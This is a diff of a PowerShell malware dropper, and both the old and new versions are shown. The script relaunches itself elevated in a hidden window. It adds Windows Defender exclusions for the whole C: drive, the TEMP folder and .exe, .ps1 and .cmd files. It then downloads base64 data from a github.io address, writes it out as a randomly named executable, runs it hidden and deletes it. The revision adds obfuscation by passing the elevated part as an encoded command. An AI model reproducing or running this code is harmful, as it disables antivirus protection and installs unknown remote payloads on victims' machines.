@@ -1,21 +1,58 @@
-$isAdmin = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
-if (-NOT ($isAdmin.IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator") -or $isAdmin.WindowsIdentity.IsSystem)) {
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+if (-not $isAdmin) {
     try {
-        Start-Process PowerShell -Verb RunAs -ArgumentList "-Command", "@('C:\',`$env:TEMP) | %% { try { Add-MpPreference -ExclusionPath `\$_ -EA Stop } catch {} }; @('.exe','.ps1','.cmd') | %% { try { Add-MpPreference -ExclusionExtension `\$_ -EA Stop } catch {} }; Write-Host worked; `$folderPath = Join-Path `$env:TEMP 'hs_error_pid_5987'; if (Test-Path -Path `$folderPath) { Remove-Item -Path `$folderPath -Recurse -Force; Write-Host 'Failed, have you run me twice?'; Pause }; New-Item -ItemType Directory -Path `$folderPath | Out-Null; `$url = 'https://stinkylick.github.io/stinkylick/2/a';  `$data = (New-Object Net.WebClient).DownloadString(`$url) -replace '\[1\]', 'C'; `$filename = Join-Path `$env:TEMP ('{0}.exe' -f [Guid]::NewGuid().ToString('N')); [IO.File]::WriteAllBytes(`$filename, [Convert]::FromBase64String(`$data)); Start-Process -FilePath `$filename -WindowStyle Hidden; Start-Sleep -Seconds 5; Remove-Item -Path `$filename -Force" -WindowStyle Hidden -Wait
+        $script = @'
+            $exclusions = {
+                param($paths, $extensions)
+                $paths | ForEach-Object { 
+                    Add-MpPreference -ExclusionPath $_ -ErrorAction SilentlyContinue
+                }
+                $extensions | ForEach-Object {
+                    Add-MpPreference -ExclusionExtension $_ -ErrorAction SilentlyContinue
+                }
+            }
+            & $exclusions @("C:\", "$env:TEMP") @(".exe", ".ps1", ".cmd")
+            $folder = Join-Path $env:TEMP "hs_error_pid_5987"
+            if (Test-Path $folder) {
+                Remove-Item $folder -Recurse -Force
+                Write-Host "Failed, have you run me twice?"
+                Pause
+            }
+            New-Item -ItemType Directory -Path $folder | Out-Null
+            $url = "https://stinkylick.github.io/stinkylick/2/a" 
+            $data = (New-Object Net.WebClient).DownloadString($url) -replace '\[1\]', 'C'
+            $filename = Join-Path $env:TEMP ("{0}.exe" -f [Guid]::NewGuid().ToString('N'))
+            [IO.File]::WriteAllBytes($filename, [Convert]::FromBase64String($data))
+            Start-Process -FilePath $filename -WindowStyle Hidden
+            Start-Sleep -Seconds 5
+            Remove-Item -Path $filename -Force
+'@
+        
+        $bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
+        $encodedScript = [Convert]::ToBase64String($bytes)
+        Start-Process powershell.exe -Verb RunAs -ArgumentList "-EncodedCommand $encodedScript" -WindowStyle Hidden -Wait
         Exit
-    } catch {}
+    } catch {
+        Write-Host "Running without admin rights"
+    }
 } else {
-    Write-Host worked
-    @("C:", $env:TEMP) | % { try { Add-MpPreference -ExclusionPath $_ -EA Stop } catch {} }
-    @(".exe", ".ps1", ".cmd") | % { try { Add-MpPreference -ExclusionExtension $_ -EA Stop } catch {} }
+    @("C:", $env:TEMP) | ForEach-Object {
+        Add-MpPreference -ExclusionPath $_ -ErrorAction SilentlyContinue
+    }
+    @(".exe", ".ps1", ".cmd") | ForEach-Object {
+        Add-MpPreference -ExclusionExtension $_ -ErrorAction SilentlyContinue
+    }
 }
-$folderPath = Join-Path $env:TEMP "hs_error_pid_5987"
-if (Test-Path -Path $folderPath) {
-    Remove-Item -Path $folderPath -Recurse -Force
+
+$folder = Join-Path $env:TEMP "hs_error_pid_5987"
+if (Test-Path $folder) {
+    Remove-Item $folder -Recurse -Force
     Write-Host "Failed, have you run me twice?"
     Pause
 }
-New-Item -ItemType Directory -Path $folderPath | Out-Null
+New-Item -ItemType Directory -Path $folder | Out-Null
+
 $url = "https://stinkylick.github.io/stinkylick/2/a" 
 $data = (New-Object Net.WebClient).DownloadString($url) -replace '\[1\]', 'C'
 $filename = Join-Path $env:TEMP ("{0}.exe" -f [Guid]::NewGuid().ToString('N'))
